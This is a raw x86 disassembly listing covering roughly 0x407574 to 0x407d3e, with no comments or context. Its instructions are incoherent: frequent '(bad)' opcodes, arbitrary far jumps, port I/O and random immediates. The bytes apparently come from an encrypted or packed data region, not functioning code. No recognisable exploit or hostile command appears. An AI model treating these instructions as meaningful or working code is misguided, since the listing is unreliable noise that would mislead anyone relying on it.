  407574:	cmp    edx,DWORD PTR ds:0xd3cd59b3
  40757a:	loopne 0x4075b2
  40757c:	mov    ecx,0x7071deae
  407581:	call   0x5c42:0x319d
  407587:	mov    bh,0x66
  407589:	adc    DWORD PTR [ebx],ebx
  40758b:	test   BYTE PTR [eax+0x3b],al
  40758e:	cmp    DWORD PTR [esi-0x1d4bbed5],eax
  407594:	popf   
  407595:	mov    ds:0x170d0b94,eax
  40759a:	ss int 0xc4
  40759d:	jnp    0x40757f
  40759f:	pop    eax
  4075a0:	cmp    cl,cl
  4075a2:	ins    BYTE PTR es:[edi],dx
  4075a3:	jae    0x407548
  4075a5:	pushf  
  4075a6:	fisttp WORD PTR [esi+0x69]
  4075a9:	xor    eax,0xfd998a39
  4075ae:	mov    esi,0x9a88957e
  4075b3:	mov    esp,0xa6e967a
  4075b8:	dec    ebx
  4075b9:	loop   0x407577
  4075bb:	jmp    0x2d1b686b
  4075c0:	and    ecx,DWORD PTR [eax+edx*4-0x4c]
  4075c4:	mov    esp,0xf6afdc29
  4075c9:	mov    eax,0x57cb3035
  4075ce:	loopne 0x407630
  4075d0:	int    0x7d
  4075d2:	pop    ds
  4075d3:	jp     0x40762f
  4075d5:	sar    DWORD PTR [ebx-0x5131c488],1
  4075db:	push   ecx
  4075dc:	jp     0x407592
  4075de:	retf   0x568c
  4075e1:	dec    ebp
  4075e2:	cmp    al,0x7b
  4075e4:	xlat   BYTE PTR ds:[ebx]
  4075e5:	mov    eax,ds:0x48c19dd3
  4075ea:	inc    bx
  4075ec:	and    eax,0x9e0b3b2e
  4075f1:	arpl   WORD PTR [eax+eiz*4],ax
  4075f4:	pop    esi
  4075f5:	push   ecx
  4075f6:	sbb    DWORD PTR [esi],ecx
  4075f8:	mov    esi,0xe5727011
  4075fd:	mov    esi,0x433b19ce
  407602:	mov    ds:0x64886fdc,al
  407607:	or     eax,0xdb28100e
  40760c:	les    ebp,FWORD PTR [ebx+0x6b62ab52]
  407612:	push   ebp
  407613:	leave  
  407614:	sbb    al,0x22
  407616:	jbe    0x40762c
  407618:	jae    0x407624
  40761a:	ds je  0x4075cc
  40761d:	add    DWORD PTR [edx-0x74de3ab6],esp
  407623:	xchg   ebx,eax
  407624:	ja     0x4075cd
  407626:	xchg   edi,eax
  407627:	lods   eax,DWORD PTR ds:[esi]
  407628:	dec    edx
  407629:	in     eax,dx
  40762a:	in     al,dx
  40762b:	sar    BYTE PTR [ecx+0x5628677e],cl
  407631:	and    ecx,DWORD PTR [esp+edx*4-0x13]
  407635:	icebp  
  407636:	pop    ebp
  407637:	jecxz  0x407654
  407639:	mov    sp,0xd985
  40763d:	ficom  DWORD PTR [eax+0x58]
  407640:	fist   DWORD PTR ds:0x943848
  407646:	cld    
  407647:	mov    al,0x98
  407649:	pop    esp
  40764a:	(bad)  
  40764b:	fs popa 
  40764d:	mov    DWORD PTR [eax+esi*4-0x6cfcd3fd],ecx
  407654:	rol    DWORD PTR [esi-0x9],1
  407657:	imul   DWORD PTR [ebp-0x26196e6f]
  40765d:	stos   DWORD PTR es:[edi],eax
  40765e:	cli    
  40765f:	jle    0x407615
  407661:	adc    al,0x35
  407663:	loope  0x407651
  407665:	shl    BYTE PTR [eax+edx*2+0x33e837be],0xdf
  40766d:	jns    0x4075fb
  40766f:	adc    esp,0x9014d7b2
  407675:	jmp    0x535684b
  40767a:	out    dx,al
  40767b:	add    BYTE PTR [eax-0xa],cl
  40767e:	sub    dh,dl
  407680:	jbe    0x4076ea
  407682:	js     0x40763c
  407684:	jle    0x40762e
  407686:	add    bh,BYTE PTR [eax-0x21acf318]
  40768c:	mov    esp,0xed211f66
  407691:	mov    ?,WORD PTR [edx-0x51]
  407694:	fmulp  st(5),st
  407696:	sbb    bh,BYTE PTR [ecx+0x770bb3b4]
  40769c:	call   0xdef0:0xee416fe
  4076a3:	adc    al,0x76
  4076a5:	out    dx,al
  4076a6:	loopne 0x4076ac
  4076a8:	stc    
  4076a9:	not    DWORD PTR [esi]
  4076ab:	pop    edi
  4076ac:	jle    0x407664
  4076ae:	xlat   BYTE PTR ds:[ebx]
  4076af:	cmp    ebp,DWORD PTR [edi+0x27b15b53]
  4076b5:	repz icebp 
  4076b7:	movq   QWORD PTR [esp+eax*8+0x7ed3c5ab],mm7
  4076bf:	mov    bl,0xe8
  4076c1:	xchg   ebp,eax
  4076c2:	xor    DWORD PTR [esi-0x5f3efbe8],ebp
  4076c8:	or     al,0x17
  4076ca:	sub    ecx,DWORD PTR ds:0x9eb6c9e
  4076d0:	jmp    0x7877:0x95cdd0e7
  4076d7:	fisttp WORD PTR [ecx]
  4076d9:	jbe    0x407684
  4076db:	lods   al,BYTE PTR ds:[esi]
  4076dd:	sub    ch,ch
  4076df:	adc    bh,al
  4076e1:	ins    DWORD PTR es:[edi],dx
  4076e2:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4076e4:	std    
  4076e5:	retf   
  4076e6:	addr16 adc ebp,0x818d17f4
  4076ed:	mov    eax,ds:0x4f4eb4ea
  4076f2:	push   cs
  4076f3:	jo     0x40772c
  4076f5:	pop    edx
  4076f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f7:	fstp   st(0)
  4076f9:	std    
  4076fa:	add    edi,DWORD PTR [edi+0x4d]
  4076fd:	cmc    
  4076fe:	jg     0x4076c5
  407700:	mov    ebp,0x3ef1c3c3
  407705:	or     ch,dh
  407707:	jge    0x4076cd
  407709:	in     eax,0xc7
  40770b:	loope  0x407706
  40770d:	(bad)  
  40770e:	push   ds
  40770f:	ja     0x407733
  407711:	(bad)  
  407712:	rcl    BYTE PTR ds:0xcd31bdd0,1
  407718:	mov    eax,edx
  40771a:	call   0xbd77d697
  40771f:	inc    edi
  407720:	sti    
  407721:	pop    ds
  407722:	sub    dl,0x2f
  407725:	cmp    al,0xc1
  407727:	mov    BYTE PTR [edi],0xea
  40772a:	call   0x9c4496e9
  40772f:	fst    QWORD PTR [ecx+0x23f72a93]
  407735:	mov    al,0x67
  407737:	jne    0x4077b3
  407739:	sahf   
  40773a:	pop    ecx
  40773b:	fmul   DWORD PTR [edi]
  40773d:	call   0x8cb14c23
  407742:	mov    al,0x1a
  407744:	push   ebx
  407745:	fcomp  QWORD PTR [edx-0x4fe03706]
  40774b:	je     0x40778f
  40774d:	xchg   DWORD PTR [ecx+0x66],esi
  407750:	mov    ebx,0x67a82723
  407755:	adc    ebp,DWORD PTR ds:0x2f32fbcc
  40775b:	int    0xf1
  40775d:	mov    dh,0xc5
  40775f:	mov    ds:0x7cfd8665,eax
  407764:	fsub   DWORD PTR [edi+eax*1+0x13]
  407768:	mov    ecx,0x87ae3b74
  40776d:	loopne 0x407755
  40776f:	fiadd  DWORD PTR [ecx]
  407771:	cmp    al,0x2d
  407773:	mov    edx,0xf45a4a75
  407778:	xor    ebx,DWORD PTR [edx-0x46]
  40777b:	in     al,dx
  40777c:	sub    eax,DWORD PTR [esi-0x41]
  40777f:	sbb    ebx,DWORD PTR [ecx+esi*1]
  407782:	or     DWORD PTR [ebx-0x1ad6ec23],edi
  407788:	lods   al,BYTE PTR ds:[esi]
  407789:	jns    0x407750
  40778b:	and    edx,DWORD PTR [eax]
  40778d:	push   cs
  40778e:	and    BYTE PTR [eax+0x45],al
  407791:	leave  
  407792:	ror    ecx,cl
  407794:	mov    eax,0x4a2d8692
  407799:	dec    esi
  40779a:	lods   eax,DWORD PTR ds:[esi]
  40779b:	stc    
  40779c:	adc    DWORD PTR ss:[ebp+0x51614de9],esi
  4077a3:	fcomi  st,st(1)
  4077a5:	sbb    al,0x64
  4077a7:	push   ss
  4077a8:	dec    ecx
  4077a9:	push   ss
  4077aa:	fisttp QWORD PTR [edx+0x62f04ff6]
  4077b0:	shl    BYTE PTR [eax-0x37b0dae4],1
  4077b6:	or     bh,cl
  4077b8:	inc    esi
  4077b9:	loop   0x4077a1
  4077bb:	lock pop ebp
  4077bd:	xchg   edi,eax
  4077be:	mov    ebx,ebx
  4077c0:	cmp    eax,edi
  4077c2:	mov    bh,0x5b
  4077c4:	push   ss
  4077c5:	cdq    
  4077c6:	mov    dh,dh
  4077c8:	inc    ebp
  4077c9:	aas    
  4077ca:	out    dx,al
  4077cb:	mov    edx,0x129763d3
  4077d0:	jne    0x4077d0
  4077d2:	nop
  4077d3:	adc    DWORD PTR [edi+0x34],0x53
  4077d7:	mov    cl,0xdc
  4077d9:	rcl    BYTE PTR [ebx-0x14bf670b],1
  4077df:	arpl   WORD PTR [edx],si
  4077e1:	(bad)  
  4077e3:	cdq    
  4077e4:	xchg   esi,eax
  4077e5:	jae    0x407862
  4077e7:	out    dx,eax
  4077e8:	loop   0x4077a0
  4077ea:	jnp    0x407853
  4077ec:	ja     0x407855
  4077ee:	cwde   
  4077ef:	or     dl,BYTE PTR [eax-0x5791b489]
  4077f5:	mov    cs,esi
  4077f7:	sbb    DWORD PTR gs:[ecx+ebp*4-0x1f72fdfd],ebp
  4077ff:	fisubr DWORD PTR [edi+eax*2]
  407802:	jb     0x407851
  407804:	xchg   esi,eax
  407805:	or     al,0xe2
  407807:	outs   dx,BYTE PTR ds:[esi]
  407808:	shl    edi,1
  40780a:	std    
  40780b:	fwait
  40780c:	(bad)  
  40780d:	cld    
  40780e:	cmp    BYTE PTR [ebp+0x5a101931],0x8a
  407815:	pop    edx
  407816:	push   esi
  407817:	sbb    BYTE PTR [ebp+0x7e],dh
  40781a:	aas    
  40781b:	daa    
  40781c:	imul   edi,DWORD PTR [edi-0x65],0x5
  407820:	cdq    
  407821:	jge    0x40784c
  407823:	or     eax,0x5ef7cc59
  407828:	shl    BYTE PTR [ebx+eax*1-0x7bf2ef4f],1
  40782f:	jmp    0xbae2:0x110bb5cb
  407836:	inc    ebx
  407837:	pop    eax
  407838:	sti    
  407839:	xor    DWORD PTR ds:0x96a04fc8,0xf336162a
  407843:	xlat   BYTE PTR ds:[ebx]
  407844:	cld    
  407845:	mov    cl,0xd5
  407847:	cmp    eax,0x2eeaea48
  40784c:	dec    BYTE PTR [ebp+0x6d]
  40784f:	mov    ah,0xbb
  407851:	jp     0x407876
  407853:	push   esi
  407854:	jo     0x407834
  407856:	sbb    al,0xe
  407858:	xchg   esi,eax
  407859:	imul   esi,DWORD PTR [ebx+0x51c017ac],0xffffffe0
  407860:	mov    bl,0xbc
  407862:	pop    ebx
  407863:	dec    DWORD PTR [edi]
  407865:	dec    ebx
  407866:	js     0x4078e7
  407868:	sbb    esi,0xffffffd3
  40786b:	sbb    DWORD PTR [edi],esp
  40786d:	and    dh,dl
  40786f:	cmp    eax,0x673d4103
  407874:	jmp    0x2d0e:0xedebddb5
  40787b:	pop    edx
  40787c:	add    eax,esp
  40787e:	test   al,0x40
  407880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407881:	mov    ?,WORD PTR ds:0xee90d8f5
  407887:	fnsave cs:[ebx]
  40788a:	jecxz  0x407812
  40788c:	(bad)  
  40788e:	sti    
  40788f:	repnz sbb BYTE PTR [eax+0x4b],0xba
  407894:	jp     0x407881
  407896:	push   ebx
  407897:	dec    ebp
  407898:	jnp    0x40781b
  40789a:	xchg   ecx,eax
  40789b:	sbb    bl,ah
  40789d:	pop    edx
  40789e:	inc    ecx
  4078a0:	dec    esp
  4078a1:	push   ebp
  4078a2:	fimul  DWORD PTR [eax]
  4078a4:	mov    bl,0xa
  4078a6:	dec    ecx
  4078a7:	out    dx,eax
  4078a8:	(bad)  [edx+0x74]
  4078ab:	adc    BYTE PTR ds:0xa757069,bl
  4078b1:	inc    edx
  4078b2:	sub    edi,DWORD PTR [ecx+0x6c]
  4078b5:	cld    
  4078b6:	push   edi
  4078b7:	bnd jg 0x407843
  4078ba:	xor    BYTE PTR [ebp-0x12],al
  4078bd:	sar    BYTE PTR [ecx],1
  4078bf:	cmp    DWORD PTR [edx+ebx*8],0x2891503d
  4078c6:	js     0x4078cc
  4078c8:	ja     0x4078b4
  4078ca:	aad    0x41
  4078cc:	mov    ds,WORD PTR [ecx]
  4078ce:	idiv   BYTE PTR [edx]
  4078d0:	maxps  xmm6,xmm5
  4078d3:	jnp    0x4078c7
  4078d5:	xchg   edx,eax
  4078d6:	jp     0x4078fa
  4078d8:	mov    dh,0x9e
  4078da:	dec    eax
  4078db:	and    BYTE PTR [esi+0x42],0x14
  4078df:	xchg   esp,eax
  4078e0:	bnd jmp 0x4078dd
  4078e3:	sub    al,0x30
  4078e5:	jbe    0x40790f
  4078e7:	fist   DWORD PTR [edi-0x91964d3]
  4078ed:	mov    edx,0x4f587eb
  4078f2:	sub    DWORD PTR [edx+eiz*1-0x4a],edx
  4078f6:	jns    0x407940
  4078f8:	mov    cl,0xab
  4078fa:	enter  0xae47,0xfd
  4078fe:	pop    edi
  4078ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407900:	imul   ebx,DWORD PTR [edi-0x5],0x9
  407904:	shl    BYTE PTR [eax-0x62],1
  407907:	addr16 jo 0x40792d
  40790a:	inc    edx
  40790b:	or     BYTE PTR [esi+0x3e],al
  40790e:	pop    ss
  40790f:	ins    BYTE PTR es:[edi],dx
  407910:	pop    eax
  407911:	xchg   edx,eax
  407912:	mov    eax,0xc3d3d6e6
  407917:	xor    eax,0xcc474633
  40791c:	(bad)  
  40791e:	data16 lahf 
  407920:	push   0xffffffde
  407922:	scas   eax,DWORD PTR es:[edi]
  407923:	push   ebp
  407924:	addr16 ja 0x407929
  407927:	(bad)  
  407928:	jnp    0x40798a
  40792a:	dec    ecx
  40792b:	push   edi
  40792c:	retf   
  40792d:	xchg   ebp,eax
  40792e:	pop    ebx
  40792f:	pop    esp
  407930:	addr16 or eax,0x404c51a5
  407936:	cdq    
  407937:	ss (bad) 
  40793a:	les    ecx,FWORD PTR [ebx]
  40793c:	stc    
  40793d:	and    BYTE PTR [esi-0x7b],0x32
  407941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407942:	das    
  407943:	and    eax,0xb06cf0b0
  407948:	not    ch
  40794a:	in     al,dx
  40794b:	adc    eax,0xcd1bbdd5
  407950:	xlat   BYTE PTR ds:[ebx]
  407951:	ficomp WORD PTR [esi-0x39]
  407954:	and    al,0x4
  407956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407957:	push   0xfb147845
  40795c:	xchg   edx,eax
  40795d:	inc    esp
  40795e:	js     0x4079bc
  407960:	repnz mov esi,0x21ee9cd2
  407966:	xor    BYTE PTR [edx+eiz*1-0x3a],0x60
  40796b:	ja     0x4079bd
  40796d:	cmc    
  40796e:	jb     0x4079a8
  407970:	out    0xe3,eax
  407972:	icebp  
  407973:	and    al,0x0
  407975:	xchg   ebp,eax
  407976:	bound  ebx,QWORD PTR [ebx]
  407978:	adc    ecx,ecx
  40797a:	out    0xc9,al
  40797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40797d:	adc    al,0xc3
  40797f:	loop   0x4079cf
  407981:	adc    BYTE PTR [ebx+0x61631142],al
  407987:	mov    dh,0x22
  407989:	jbe    0x4079b6
  40798b:	xor    dl,BYTE PTR [ebx-0x1db02fd0]
  407991:	inc    ebp
  407992:	pop    es
  407993:	fucomi st,st(2)
  407995:	popa   
  407996:	sbb    eax,0xce772ad8
  40799b:	push   es
  40799c:	lock sbb BYTE PTR [edx+edi*2-0x50d2006d],dh
  4079a4:	ins    DWORD PTR es:[edi],dx
  4079a5:	or     ch,BYTE PTR [edi+eiz*8]
  4079a8:	xor    al,0x54
  4079aa:	xchg   dl,dl
  4079ac:	fwait
  4079ad:	iret   
  4079ae:	fcomp  st(1)
  4079b0:	ret    0x770c
  4079b3:	jle    0x407a0a
  4079b5:	push   eax
  4079b6:	mov    ch,0x73
  4079b8:	mov    eax,ds:0x84616deb
  4079bd:	in     eax,dx
  4079be:	mov    ebx,0xf3afa5b3
  4079c3:	or     dl,BYTE PTR [edi-0x56383e2b]
  4079c9:	addr16 lock jno 0x4079d7
  4079cd:	out    0x9d,al
  4079cf:	les    esp,FWORD PTR [esi+0x11]
  4079d2:	arpl   WORD PTR [ecx-0x68],bx
  4079d5:	ret    0x7888
  4079d8:	pop    ss
  4079d9:	out    dx,al
  4079da:	pop    esp
  4079db:	adc    ebp,ecx
  4079dd:	pop    ss
  4079de:	dec    ebp
  4079df:	mov    ?,WORD PTR [ecx-0x1ec217f1]
  4079e5:	adc    bh,BYTE PTR [edx+0x6e984e5c]
  4079eb:	ret    
  4079ec:	push   0x8824f8f6
  4079f1:	push   edx
  4079f2:	cmp    al,0x72
  4079f4:	shl    DWORD PTR [edi],0x5
  4079f7:	stc    
  4079f8:	retf   0x1fac
  4079fb:	in     eax,dx
  4079fc:	or     eax,0x508e684
  407a01:	fnstenv [eax-0x371c6343]
  407a07:	out    dx,eax
  407a08:	sub    DWORD PTR [edx],eax
  407a0a:	cmp    cl,BYTE PTR [ebx-0x25]
  407a0d:	push   edi
  407a0e:	outs   dx,DWORD PTR ds:[esi]
  407a0f:	push   ss
  407a10:	cmc    
  407a11:	pop    ss
  407a12:	ja     0x407a5e
  407a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a15:	ins    DWORD PTR es:[edi],dx
  407a16:	aaa    
  407a17:	inc    eax
  407a18:	pop    ds
  407a19:	sub    al,0xe1
  407a1b:	inc    esp
  407a1c:	dec    ebp
  407a1d:	ins    DWORD PTR es:[edi],dx
  407a1e:	iret   
  407a1f:	gs pop ds
  407a21:	mov    ?,WORD PTR [ebx+0xa738237]
  407a27:	inc    eax
  407a28:	loope  0x407aa2
  407a2a:	push   ds
  407a2b:	scas   al,BYTE PTR es:[edi]
  407a2c:	jmp    0x407a74
  407a2e:	adc    al,0x97
  407a30:	daa    
  407a31:	test   eax,0x7f2d8062
  407a36:	imul   edx,ebp,0xd23e05f4
  407a3c:	mov    BYTE PTR [edx-0x7389681c],ch
  407a42:	fcomp  st(4)
  407a44:	std    
  407a45:	add    eax,0x53e2e764
  407a4a:	xlat   BYTE PTR ds:[ebx]
  407a4b:	lods   eax,DWORD PTR ds:[esi]
  407a4c:	fcmovnu st,st(2)
  407a4e:	retf   0xf109
  407a51:	push   0xfffffff2
  407a53:	sub    DWORD PTR ds:0xf4bf976,0x6a
  407a5a:	push   es
  407a5b:	mov    al,0xd8
  407a5d:	pop    es
  407a5e:	loope  0x407a40
  407a60:	and    DWORD PTR [esi+edi*4+0x26ca429f],ebp
  407a67:	lea    ecx,[eax-0x1d]
  407a6a:	in     al,0xbd
  407a6c:	add    BYTE PTR [edi-0x10],0xa3
  407a70:	mov    esi,0xfe967ab
  407a75:	loopne 0x407a14
  407a77:	pop    edx
  407a78:	push   ecx
  407a79:	std    
  407a7a:	sbb    eax,0xd34a0095
  407a7f:	cdq    
  407a80:	pop    ebp
  407a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a82:	lahf   
  407a83:	mov    esp,0x4de0ccfb
  407a88:	mov    edi,0x43289727
  407a8d:	lock dec DWORD PTR [ebp+0x1d]
  407a91:	push   0x34
  407a93:	ds push edx
  407a95:	lock inc esp
  407a97:	ins    BYTE PTR es:[edi],dx
  407a98:	in     al,dx
  407a99:	sar    ch,1
  407a9b:	dec    esp
  407a9c:	pushf  
  407a9d:	popa   
  407a9e:	jnp    0x407b0d
  407aa0:	or     BYTE PTR [ebp+0x5c07a163],bl
  407aa6:	push   0x6f021302
  407aab:	(bad)  
  407aac:	ds xchg bl,cl
  407aaf:	outs   dx,DWORD PTR ds:[esi]
  407ab0:	dec    esp
  407ab1:	lea    ebp,[ebp+eax*2-0x11]
  407ab5:	push   DWORD PTR [ebx-0x80a5c1b]
  407abb:	fcmovb st,st(5)
  407abd:	jg     0x407a52
  407abf:	retf   0xae4
  407ac2:	mov    esi,0x5dfcae0d
  407ac7:	lahf   
  407ac8:	(bad)  
  407ac9:	stc    
  407aca:	cld    
  407acb:	dec    esi
  407acc:	mov    cl,0xef
  407ace:	out    dx,eax
  407acf:	das    
  407ad0:	add    al,BYTE PTR [esp+ecx*4]
  407ad3:	adc    esp,DWORD PTR [ecx+0xc]
  407ad6:	lods   eax,DWORD PTR ds:[esi]
  407ad7:	das    
  407ad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ad9:	scas   eax,DWORD PTR es:[edi]
  407ada:	or     dh,BYTE PTR [edi-0x5c]
  407add:	je     0x407afb
  407adf:	mov    eax,0xdece435
  407ae4:	fisub  DWORD PTR [esi]
  407ae6:	adc    DWORD PTR [edi],eax
  407ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ae9:	fwait
  407aea:	sbb    DWORD PTR [edx+0x2d],edi
  407aed:	mov    eax,0x3e5057b5
  407af3:	jg     0x407b65
  407af5:	(bad)  
  407af6:	xor    DWORD PTR [eax-0x4a95ad04],0xffffffc7
  407afd:	fisub  DWORD PTR [ebx+edi*1]
  407b00:	rol    ch,0x2d
  407b03:	sbb    esi,esi
  407b05:	ds mov dh,0xf3
  407b08:	adc    DWORD PTR [esi-0x6e],edx
  407b0b:	add    ch,BYTE PTR [ebp-0x4b]
  407b0e:	fnstcw WORD PTR [edi-0x4d]
  407b11:	adc    bl,BYTE PTR [esi+0x3bb28a61]
  407b17:	sub    ah,BYTE PTR [edx]
  407b19:	or     esi,DWORD PTR [ecx-0x45]
  407b1c:	sbb    BYTE PTR ds:0x13fbedbc,ah
  407b22:	mov    ds:0x717bcbc3,eax
  407b27:	fucomi st,st(4)
  407b29:	mov    ch,0x5f
  407b2b:	repnz pop ss
  407b2d:	dec    esi
  407b2e:	bound  eax,QWORD PTR [edx]
  407b30:	pop    edx
  407b31:	jbe    0x407ac2
  407b33:	jno    0x407b31
  407b35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b36:	sbb    ebx,DWORD PTR [edx-0x5d540346]
  407b3c:	mov    ebp,0x71a57e4b
  407b41:	mov    eax,0xcb1eb1b5
  407b46:	jmp    0x74638f44
  407b4b:	dec    ecx
  407b4c:	mov    dl,0x9a
  407b4e:	pop    ds
  407b4f:	mov    eax,ds:0xe7516547
  407b54:	jmp    FWORD PTR ds:0x81fabb9f
  407b5a:	jnp    0x407b81
  407b5c:	inc    edi
  407b5d:	cmp    BYTE PTR [edi],ch
  407b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b60:	cdq    
  407b61:	pop    es
  407b62:	jns    0x407b1d
  407b64:	add    BYTE PTR [edx+eax*4-0x121878cf],ch
  407b6b:	inc    ebx
  407b6c:	cli    
  407b6d:	xchg   esp,eax
  407b6e:	mov    ds:0xced0c6a2,eax
  407b73:	and    edi,esi
  407b75:	jp     0x407beb
  407b77:	mov    esi,0x82cbeec2
  407b7c:	adc    ah,cl
  407b7e:	jp     0x407b5d
  407b80:	fwait
  407b81:	mov    eax,0x895bed53
  407b86:	sbb    al,0x58
  407b88:	ins    BYTE PTR es:[edi],dx
  407b89:	dec    ebx
  407b8a:	sub    al,0xfe
  407b8c:	sbb    DWORD PTR [ebx+0x61bb45ca],0xffffff98
  407b93:	mov    BYTE PTR [edx],bl
  407b95:	dec    ecx
  407b96:	es inc edx
  407b98:	xchg   esi,eax
  407b99:	or     al,0xba
  407b9b:	cmp    dh,BYTE PTR [edi-0x1bda50db]
  407ba1:	inc    edi
  407ba2:	dec    edx
  407ba3:	jg     0x407ba7
  407ba5:	sub    al,BYTE PTR [ecx+0x5b]
  407ba8:	xor    al,0xef
  407baa:	icebp  
  407bab:	out    dx,al
  407bac:	add    esp,DWORD PTR [esi+0x170254a5]
  407bb2:	mov    ebx,0xb6766cac
  407bb7:	sub    DWORD PTR [ebx+eiz*4-0x1fbb9e5b],esi
  407bbe:	xchg   ecx,eax
  407bbf:	mov    ecx,0x7720c3ab
  407bc4:	mov    edi,0xeed51936
  407bc9:	retf   0xe72e
  407bcc:	sub    eax,0xd755c4a4
  407bd1:	cmp    eax,0x85596e4b
  407bd6:	sub    DWORD PTR [ecx+0x62],0xffffffcf
  407bda:	mov    ?,WORD PTR gs:[ebp+edx*1+0x16d761d9]
  407be2:	nop
  407be3:	pop    edi
  407be4:	cvtdq2ps xmm3,xmm6
  407be7:	sahf   
  407be8:	icebp  
  407be9:	mov    al,ds:0x2170cc74
  407bee:	adc    BYTE PTR [edx-0x34],0x6d
  407bf2:	sbb    eax,0xb154f9c4
  407bf7:	or     eax,0xec2d1eb0
  407bfd:	jb     0x407c77
  407bff:	int    0xd0
  407c01:	loop   0x407c09
  407c03:	add    esp,DWORD PTR [esi]
  407c05:	fistp  QWORD PTR [edi]
  407c07:	mov    al,ds:0x3e054ba3
  407c0c:	push   0xffffff91
  407c0e:	cdq    
  407c0f:	fldenv [edx-0x58]
  407c12:	pushf  
  407c13:	or     al,0x8b
  407c15:	add    eax,DWORD PTR [ebp+0x69]
  407c18:	push   esp
  407c19:	adc    BYTE PTR [eax-0x32],dl
  407c1c:	ds xchg esi,eax
  407c1e:	imul   edx,DWORD PTR [edx],0x6e5ea0a
  407c24:	adc    ecx,DWORD PTR [edx-0x2]
  407c27:	retf   
  407c28:	push   edx
  407c29:	repnz adc esi,esi
  407c2c:	mov    cl,0x84
  407c2e:	daa    
  407c2f:	pop    ebx
  407c30:	mov    ch,bl
  407c32:	jecxz  0x407bb9
  407c34:	sbb    edx,DWORD PTR [eax]
  407c36:	xchg   edi,eax
  407c37:	mov    edx,0x41637a4d
  407c3c:	sar    WORD PTR [eax+0x6e],cl
  407c40:	call   0x2aa6:0xa4e1969c
  407c47:	(bad)  
  407c48:	(bad)  
  407c49:	push   ecx
  407c4a:	addr16 test al,0x9c
  407c4d:	jbe    0x407c83
  407c4f:	add    BYTE PTR [edx-0x512411f8],dh
  407c55:	xor    eax,0xce1ee207
  407c5a:	xor    DWORD PTR [ebx+0x69],0xa02ce47f
  407c61:	sbb    ebp,DWORD PTR [edi+edx*4+0x40568411]
  407c68:	or     eax,0xe5feb3aa
  407c6d:	mov    ebx,0xd0ef1494
  407c72:	add    eax,0x43bae45e
  407c77:	xchg   esi,eax
  407c78:	(bad)  
  407c79:	outs   dx,BYTE PTR ds:[esi]
  407c7a:	pop    es
  407c7b:	or     ebx,ecx
  407c7d:	std    
  407c7e:	das    
  407c7f:	mov    edi,0xd805f6fa
  407c84:	pop    es
  407c85:	cmc    
  407c86:	inc    edi
  407c87:	lods   eax,DWORD PTR ds:[esi]
  407c88:	adc    BYTE PTR [edx],cl
  407c8a:	add    eax,0x2401e801
  407c8f:	jns    0x407c26
  407c91:	pop    esi
  407c92:	mov    DWORD PTR [edx-0x27],edi
  407c95:	(bad)  
  407c96:	pop    ebp
  407c97:	pusha  
  407c98:	loopne 0x407c2b
  407c9a:	mov    ah,0xb4
  407c9c:	cdq    
  407c9d:	or     al,0xf
  407c9f:	dec    ebx
  407ca0:	ja     0x407c28
  407ca2:	in     al,0x16
  407ca4:	pushf  
  407ca5:	call   0x2b4eae89
  407caa:	or     DWORD PTR [ecx],0xffffffa6
  407cad:	jne    0x407ceb
  407caf:	cmp    edi,esi
  407cb1:	popf   
  407cb2:	jmp    0x407d2d
  407cb4:	sar    BYTE PTR [eax],cl
  407cb6:	adc    dl,BYTE PTR [esi+0x1f]
  407cb9:	loope  0x407cdf
  407cbb:	xchg   ebp,eax
  407cbc:	outs   dx,DWORD PTR ds:[esi]
  407cbd:	xchg   edi,eax
  407cbe:	mov    eax,0xf5ceb36b
  407cc3:	fisub  DWORD PTR [eax+0x61d4bc5c]
  407cc9:	in     eax,0xaa
  407ccb:	inc    eax
  407ccc:	mov    es,WORD PTR [ebx]
  407cce:	xchg   ebp,eax
  407ccf:	add    ebp,DWORD PTR [edi-0xc]
  407cd2:	dec    esp
  407cd3:	pop    ecx
  407cd4:	aad    0x25
  407cd6:	sar    dh,cl
  407cd8:	enter  0x50e1,0xb6
  407cdc:	in     eax,dx
  407cdd:	int    0x95
  407cdf:	and    eax,DWORD PTR [ecx-0x66]
  407ce2:	test   cl,al
  407ce4:	and    al,0x1a
  407ce6:	adc    eax,0xc9c4887a
  407ceb:	xlat   BYTE PTR ds:[ebx]
  407cec:	hlt    
  407ced:	inc    DWORD PTR [ebx]
  407cef:	mov    cl,0xe4
  407cf1:	lods   eax,DWORD PTR ds:[esi]
  407cf2:	dec    ebp
  407cf3:	in     eax,dx
  407cf4:	into   
  407cf5:	cli    
  407cf6:	stc    
  407cf7:	mov    ch,0x97
  407cf9:	and    al,0xb8
  407cfb:	dec    esi
  407cfc:	adc    ebp,DWORD PTR [edx+0x18b8b8d4]
  407d02:	lods   al,BYTE PTR ds:[esi]
  407d03:	(bad)  
  407d04:	lahf   
  407d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d06:	ds int 0xff
  407d09:	daa    
  407d0a:	dec    edi
  407d0b:	or     BYTE PTR [edi-0x7e],ch
  407d0e:	adc    BYTE PTR [eax],0xb
  407d11:	mov    ch,0x10
  407d13:	lods   al,BYTE PTR ds:[esi]
  407d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d15:	mov    esp,0x5d4c5857
  407d1a:	push   0x8a1d9541
  407d1f:	repz int3 
  407d21:	lahf   
  407d22:	test   cl,ah
  407d24:	xchg   ebp,eax
  407d25:	sub    al,BYTE PTR [ebp+0x5b]
  407d28:	cmp    ah,BYTE PTR [ebx]
  407d2a:	mov    ds:0x9c35a070,eax
  407d2f:	pop    esi
  407d30:	outs   dx,DWORD PTR ds:[esi]
  407d31:	adc    al,0xe8
  407d33:	push   edi
  407d34:	mov    ds:0xcda7e7a,eax
  407d39:	or     BYTE PTR [edx],dl
  407d3b:	sbb    eax,DWORD PTR [eax+0x1c]
  407d3e:	ret    
